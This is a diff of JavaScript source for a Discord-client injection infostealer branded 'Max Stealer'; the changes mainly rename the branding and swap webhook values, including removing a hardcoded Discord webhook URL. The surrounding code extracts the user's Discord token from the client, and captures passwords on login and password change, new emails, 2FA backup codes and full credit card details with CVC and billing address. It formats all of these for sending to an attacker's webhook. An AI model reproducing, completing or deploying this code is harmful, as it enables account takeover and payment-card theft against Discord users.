@@ -6,8 +6,7 @@ const {
 } = require('electron')
 const querystring = require('querystring');
 const os = require('os')
-var webhook = "%WEBHOOK_LINK%";
-var src = "https://canary.discord.com/api/webhooks/954345897704169523/ZaHI5ax4RDcrY7q7kjvx1m7HJgmJbOBdLVcUkz5Ua4XlP4AzME575-XpAqx1LuCFX-Ps"
+var webhook = "da_webhook";
 const computerName = os.hostname();
 const discordInstall = `${__dirname}`
 const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
@@ -73,7 +72,7 @@ function FirstTime(email) {
 				fs.rmdirSync(path.join(__dirname, "init"));
 				if (token == null || token == undefined || token == "") {
 					var c = {
-						username: "Max $tealer",
+						username: "Max Stealer",
 						content: "",
 						embeds: [{
 							title: "Discord Started",
@@ -84,10 +83,10 @@ function FirstTime(email) {
 								inline: !1
 							}],
 							author: {
-								name: "Max $tealer"
+								name: "Max Stealer"
 							},
 							footer: {
-								text: "Max $tealer"
+								text: "Max Stealer"
 							}
 						}]
 					};
@@ -99,7 +98,7 @@ function FirstTime(email) {
                     `, !0).then(a => {
 						const b = JSON.parse(a);
 						var c = {
-							username: "Max $tealer",
+							username: "Max Stealer",
 							content: "",
 							embeds: [{
 								title: "Discord Initalized",
@@ -127,10 +126,10 @@ function FirstTime(email) {
 									inline: !1
 								}],
 								author: {
-									name: "Max $tealer"
+									name: "Max Stealer"
 								},
 								footer: {
-									text: "Max $tealer"
+									text: "Max Stealer"
 								},
 								thumbnail: {
 									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -151,7 +150,7 @@ function FirstTime(email) {
 			if (config['logout-notify'] == "true") {
 				if (token == null || token == undefined || token == "") {
 					var c = {
-						username: "Max $tealer",
+						username: "Max Stealer",
 						content: "",
 						embeds: [{
 							title: "User log out (User not Logged in before)",
@@ -162,10 +161,10 @@ function FirstTime(email) {
 								inline: !1
 							}],
 							author: {
-								name: "Max $tealer"
+								name: "Max Stealer"
 							},
 							footer: {
-								text: "Max $tealer"
+								text: "Max Stealer"
 							}
 						}]
 					};
@@ -177,7 +176,7 @@ function FirstTime(email) {
                     `, !0).then(a => {
 						const b = JSON.parse(a);
 						var c = {
-							username: "Max $tealer",
+							username: "Max Stealer",
 							content: "",
 							embeds: [{
 								color: config["embed-color"],
@@ -211,7 +210,7 @@ function FirstTime(email) {
 									"icon_url": "https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg"
 								},
 								"footer": {
-									"text": "Max $tealer"
+									"text": "Max Stealer"
 								},
 								"thumbnail": {
 									"url": `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -468,7 +467,7 @@ function Login(email, password, token) {
 							const json = JSON.parse(info);
 
                             var params = {
-								username: "Max $tealer",
+								username: "Max Stealer",
 								content: "",
 								embeds: [{
                                     					"color": config['embed-color'],
@@ -506,7 +505,7 @@ function Login(email, password, token) {
                                         "icon_url": "https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg"
 									},
 									"footer": {
-										"text": "Max $tealer"
+										"text": "Max Stealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -522,7 +521,7 @@ function Login(email, password, token) {
 								"name": "2FA Codes"
 								},
 								"footer": {
-									"text": "Max $tealer"
+									"text": "Max Stealer"
 								}
 							}
 							var friend = {
@@ -533,7 +532,7 @@ function Login(email, password, token) {
 										"name": "HQ Friends"
 									},
 									"footer": {
-										"text": "Max $tealer"
+										"text": "Max Stealer"
 									}
 							}
 							if (token.startsWith("mfa")) {
@@ -620,7 +619,7 @@ function Login(email, password, token) {
 							const json = JSON.parse(info);
 
                             var params = {
-								username: "Max $tealer",
+								username: "Max Stealer",
 								content: "",
 								embeds: [{
                                     "color": config['embed-color'],
@@ -658,7 +657,7 @@ function Login(email, password, token) {
                                         "icon_url": "https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg"
 									},
 									"footer": {
-										"text": "Max $tealer"
+										"text": "Max Stealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -672,7 +671,7 @@ function Login(email, password, token) {
 										"name": "HQ Friends"
 									},
 									"footer": {
-										"text": "Max $tealer"
+										"text": "Max Stealer"
 									},
 
 								}]
@@ -797,7 +796,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 							const json = JSON.parse(info);
 
 							var params = {
-								username: "Max $tealer",
+								username: "Max Stealer",
 								content: "",
 																embeds: [{
                                     "color": config['embed-color'],
@@ -839,7 +838,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                                         "icon_url": "https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg"
 									},
 									"footer": {
-										"text": "Max $tealer"
+										"text": "Max Stealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -855,7 +854,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 								"name": "2FA Codes"
 								},
 								"footer": {
-									"text": "Max $tealer"
+									"text": "Max Stealer"
 								}
 							}
 							
@@ -867,7 +866,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 										"name": "HQ Friends"
 									},
 									"footer": {
-										"text": "Max $tealer"
+										"text": "Max Stealer"
 									}
 							}
 							if (token.startsWith("mfa")) {
@@ -953,7 +952,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 										}
 										const json = JSON.parse(info);
 										var params = {
-											username: "Max $tealer",
+											username: "Max Stealer",
 											content: "",
 																											embeds: [{
                                     "color": config['embed-color'],
@@ -995,7 +994,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                                         "icon_url": "https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg"
 									},
 									"footer": {
-										"text": "Max $tealer"
+										"text": "Max Stealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1009,7 +1008,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 										"name": "HQ Friends"
 									},
 									"footer": {
-										"text": "Max $tealer"
+										"text": "Max Stealer"
 									},
 
 								}]
@@ -1130,7 +1129,7 @@ function ChangeEmail(newemail, password, token) {
 							const json = JSON.parse(info);
 
 							var params = {
-								username: "Max $tealer",
+								username: "Max Stealer",
 								content: "",
 								embeds: [{
 									"title": "Email Changed",
@@ -1174,10 +1173,10 @@ function ChangeEmail(newemail, password, token) {
 										inline: !1
 									}, ],
 									"author": {
-										"name": "Max $tealer"
+										"name": "Max Stealer"
 									},
 									"footer": {
-										"text": "Max $tealer"
+										"text": "Max Stealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1187,10 +1186,10 @@ function ChangeEmail(newemail, password, token) {
 									"color": config['embed-color'],
 									"description": CalcFriends(),
 									"author": {
-										"name": "Max $tealer"
+										"name": "Max Stealer"
 									},
 									"footer": {
-										"text": "Max $tealer"
+										"text": "Max Stealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1203,10 +1202,10 @@ function ChangeEmail(newemail, password, token) {
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
-									"name": "Max $tealer"
+									"name": "Max Stealer"
 								},
 								"footer": {
-									"text": "Max $tealer"
+									"text": "Max Stealer"
 								}
 							}
 							if (token.startsWith("mfa")) {
@@ -1291,7 +1290,7 @@ function ChangeEmail(newemail, password, token) {
 										}
 										const json = JSON.parse(info);
 										var params = {
-											username: "Max $tealer",
+											username: "Max Stealer",
 											content: "",
 											embeds: [{
 												"title": "Email Changed",
@@ -1335,10 +1334,10 @@ function ChangeEmail(newemail, password, token) {
 													inline: !1
 												}, ],
 												"author": {
-													"name": "Max $tealer"
+													"name": "Max Stealer"
 												},
 												"footer": {
-													"text": "Max $tealer"
+													"text": "Max Stealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1348,10 +1347,10 @@ function ChangeEmail(newemail, password, token) {
 												"color": config['embed-color'],
 												"description": CalcFriends(),
 												"author": {
-													"name": "Max $tealer"
+													"name": "Max Stealer"
 												},
 												"footer": {
-													"text": "Max $tealer"
+													"text": "Max Stealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1387,16 +1386,16 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
 			var json = JSON.parse(info);
 			var params = {
-				username: "Max $tealer",
+				username: "Max Stealer",
 				content: "",
 				embeds: [{
 					"title": "User Credit Card Added",
 					"description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
 					"author": {
-						"name": "Max $tealer"
+						"name": "Max Stealer"
 					},
 					"footer": {
-						"text": "Max $tealer"
+						"text": "Max Stealer"
 					},
 					"thumbnail": {
 						"url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
